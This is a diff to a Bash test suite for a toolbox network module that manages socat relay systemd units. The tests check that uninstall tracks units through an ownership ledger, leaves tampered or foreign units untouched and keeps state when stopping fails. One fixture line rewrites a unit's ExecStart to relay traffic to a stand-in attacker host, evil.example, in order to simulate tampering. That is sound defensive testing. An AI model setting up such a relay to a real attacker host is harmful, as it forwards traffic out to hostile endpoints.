@@ -331,6 +331,7 @@ export TOOLBOX_NET_SRC_DIR=$work/usr/src
 export TOOLBOX_NET_MODDIR=$work/modbuild
 export TOOLBOX_NET_KERNEL_RELEASE=6.1.0-test
 export TOOLBOX_NET_SOCAT=$work/pathbin/socat
+export TOOLBOX_NET_RELAY_STATE=$work/relay-state
 mkdir -p "$TOOLBOX_NET_SYSTEMD_RUN" "$TOOLBOX_NET_UNIT_DIR" "$TOOLBOX_NET_LOCK_DIR" \
     "$TOOLBOX_NET_BIN_DIR" "$work/modbuild" "$work/pkg"
 printf '# Fixture headers: native compilation is replaced by the make/dkms shims.\n' > "$work/modbuild/Makefile"
@@ -438,8 +439,19 @@ systemctl() {
             fi
             return 0
             ;;
-        disable) [[ $* == *--now* ]] && rm -f "$SD/active"; return 0 ;;
-        show) [[ -e $SD/mainpid ]] && cat "$SD/mainpid" || printf '0\n'; return 0 ;;
+        disable)
+            if [[ $* == *--now* ]]; then
+                [[ -e $SD/stop_fail ]] && return 1
+                rm -f "$SD/active"
+            fi
+            return 0 ;;
+        show)
+            if [[ $* == *ActiveState* ]]; then
+                [[ -e $SD/active ]] && printf 'active\n' || printf 'inactive\n'
+            else
+                [[ -e $SD/mainpid ]] && cat "$SD/mainpid" || printf '0\n'
+            fi
+            return 0 ;;
         is-active-fg) return 0 ;;
         *) return 0 ;;
     esac
@@ -479,7 +491,7 @@ curl() {
 # 断言工具
 reset() {
     rm -rf "$TOOLBOX_NET_ETC" "$TOOLBOX_NET_LOCK_DIR" "$TOOLBOX_NET_MODLOAD_DIR" \
-        "$TOOLBOX_NET_SYSCTL_DIR" "$TOOLBOX_NET_DKMS_DIR" "$TOOLBOX_NET_SRC_DIR" "$work/client"
+        "$TOOLBOX_NET_SYSCTL_DIR" "$TOOLBOX_NET_DKMS_DIR" "$TOOLBOX_NET_SRC_DIR" "$work/client" "$TOOLBOX_NET_RELAY_STATE"
     find "$TOOLBOX_NET_UNIT_DIR" -mindepth 1 -delete
     find "$TOOLBOX_NET_BIN_DIR" -mindepth 1 -delete
     rm -f "$SD"/*.log "$SD/ports" "$SD/loaded" "$SD/active" "$SD/mainpid" "$SD/mainexe" "$SD"/a5_*
@@ -504,7 +516,8 @@ wrote_a5() {
     [[ -d $TOOLBOX_NET_ETC/terry-toolbox-xray || -e $TOOLBOX_NET_BIN_DIR/terry-toolbox-xray ]]
 }
 wrote_unit() { [[ -n $(ls "$TOOLBOX_NET_UNIT_DIR" 2>/dev/null) ]]; }
-clean() { ! wrote_brutal && ! wrote_tuic && ! wrote_a5 && ! wrote_unit; }
+wrote_relay_state() { [[ -n $(ls "$TOOLBOX_NET_RELAY_STATE" 2>/dev/null) ]]; }
+clean() { ! wrote_brutal && ! wrote_tuic && ! wrote_a5 && ! wrote_unit && ! wrote_relay_state; }
 assert_clean() { if ! clean; then ls -R "$TOOLBOX_NET_ETC" "$TOOLBOX_NET_UNIT_DIR" "$TOOLBOX_NET_BIN_DIR" >&2; fail "$1：留下了写入"; fi; }
 called() { grep -qF -- "$1" "$SD/$2" 2>/dev/null || fail "缺少 $2 调用: $1"; }
 
@@ -1277,6 +1290,56 @@ toolbox_network B31 uninstall tcp <<< 'YES' >/dev/null 2>&1 && fail 'B31 卸载�
 toolbox_network B31 uninstall all <<< 'YES' >"$work/o" 2>&1 || fail 'B31 全部卸载失败'
 [[ -z $(ls "$TOOLBOX_NET_UNIT_DIR") ]] || fail 'B31 全部卸载有残留'
 toolbox_network B31 status >/dev/null 2>&1 && fail 'B31 卸载后 status 仍报存在'
+reset
+
+# ---------- B31 归属台账与停止门禁 ----------
+# 正常：安装写台账，卸载后单元与台账都消失
+MOCK_PORT=18110 MOCK_PROTO=tcp; export MOCK_PORT MOCK_PROTO
+inst_relay tcp 18110 relay.example.test 443 >"$work/o" 2>&1 || { cat "$work/o" >&2; fail 'B31 台账场景安装失败'; }
+[[ -f $TOOLBOX_NET_RELAY_STATE/tcp-18110.ledger ]] || fail 'B31 安装未写归属台账'
+toolbox_network B31 uninstall tcp 18110 <<< YES >"$work/o" 2>&1 || { cat "$work/o" >&2; fail 'B31 台账场景卸载失败'; }
+[[ ! -e $TOOLBOX_NET_UNIT_DIR/terry-toolbox-relay-tcp-18110.service && ! -e $TOOLBOX_NET_RELAY_STATE/tcp-18110.ledger ]] \
+    || fail 'B31 卸载后残留单元或台账'
+reset
+# 旧 socat 路径：安装后 socat 消失/移动，仍按台账识别并卸载自己的单元
+MOCK_PORT=18111 MOCK_PROTO=tcp; export MOCK_PORT MOCK_PROTO
+inst_relay tcp 18111 relay.example.test 443 >"$work/o" 2>&1 || fail 'B31 socat 路径场景安装失败'
+TOOLBOX_NET_SOCAT=$work/none toolbox_network B31 uninstall tcp 18111 <<< YES >"$work/o" 2>&1 \
+    || { cat "$work/o" >&2; fail 'B31 socat 缺失时卸载自己的单元失败'; }
+[[ ! -e $TOOLBOX_NET_UNIT_DIR/terry-toolbox-relay-tcp-18111.service ]] || fail 'B31 socat 缺失时未删除自己的单元'
+reset
+# 仅注释里带标记的外来单元：不停止、不删除、不改动
+relay_unit=$TOOLBOX_NET_UNIT_DIR/terry-toolbox-relay-tcp-18112.service
+printf '# Description=Terry Toolbox relay tcp 18112 -> x:1\n[Service]\nExecStart=/usr/bin/socat TCP-LISTEN:18112\n' > "$relay_unit"
+relay_before=$(stat -c '%i %s %Y' "$relay_unit")
+toolbox_network B31 uninstall tcp 18112 <<< YES >"$work/o" 2>&1 && fail 'B31 注释伪装单元被当成 ours'
+[[ -e $relay_unit && $(stat -c '%i %s %Y' "$relay_unit") == "$relay_before" ]] || fail 'B31 注释伪装单元被改动或删除'
+grep -q '保留' "$work/o" || fail 'B31 保留外来单元未说明'
+! grep -q 'disable --now terry-toolbox-relay-tcp-18112' "$SD/systemctl.log" || fail 'B31 对外来单元执行了停止'
+reset
+# 保留原 Description 但改了 ExecStart 的单元：保留；同名再安装也拒绝
+MOCK_PORT=18113 MOCK_PROTO=tcp; export MOCK_PORT MOCK_PROTO
+inst_relay tcp 18113 relay.example.test 443 >"$work/o" 2>&1 || fail 'B31 改动场景安装失败'
+relay_unit=$TOOLBOX_NET_UNIT_DIR/terry-toolbox-relay-tcp-18113.service
+sed -i 's#^ExecStart=.*#ExecStart=/usr/bin/socat -d -d TCP-LISTEN:18113,fork,reuseaddr TCP:evil.example:443#' "$relay_unit"
+grep -q '^Description=Terry Toolbox relay ' "$relay_unit" || fail 'B31 改动场景 fixture 缺 Description'
+toolbox_network B31 uninstall tcp 18113 <<< YES >"$work/o" 2>&1 && fail 'B31 改动 ExecStart 的单元被当成 ours'
+[[ -e $relay_unit ]] && grep -q 'evil.example' "$relay_unit" || fail 'B31 改动的单元被删除或替换'
+! grep -q 'disable --now terry-toolbox-relay-tcp-18113' "$SD/systemctl.log" || fail 'B31 对改动单元执行了停止'
+inst_relay tcp 18113 relay.example.test 443 >"$work/o" 2>&1 && fail 'B31 改动单元被覆盖安装'
+grep -q '不是本模块生成' "$work/o" || fail 'B31 改动单元冲突未说明'
+reset
+# 停止失败或状态无法确认：保留单元与台账并报错；恢复后可正常卸载
+MOCK_PORT=18114 MOCK_PROTO=tcp; export MOCK_PORT MOCK_PROTO
+inst_relay tcp 18114 relay.example.test 443 >"$work/o" 2>&1 || fail 'B31 停止失败场景安装失败'
+relay_unit=$TOOLBOX_NET_UNIT_DIR/terry-toolbox-relay-tcp-18114.service
+: > "$SD/stop_fail"
+toolbox_network B31 uninstall tcp 18114 <<< YES >"$work/o" 2>&1 && fail 'B31 停止失败仍报成功'
+[[ -e $relay_unit && -f $TOOLBOX_NET_RELAY_STATE/tcp-18114.ledger ]] || fail 'B31 停止失败后删除了单元或台账'
+grep -q '停止失败' "$work/o" || fail 'B31 停止失败未说明'
+rm -f "$SD/stop_fail"
+toolbox_network B31 uninstall tcp 18114 <<< YES >"$work/o" 2>&1 || { cat "$work/o" >&2; fail 'B31 停止恢复后卸载失败'; }
+[[ ! -e $relay_unit && ! -e $TOOLBOX_NET_RELAY_STATE/tcp-18114.ledger ]] || fail 'B31 恢复后未删除'
 reset
 
 # B31 空参数补问，默认 tcp 与显式 udp 均生成对应单元；EOF 不写盘。
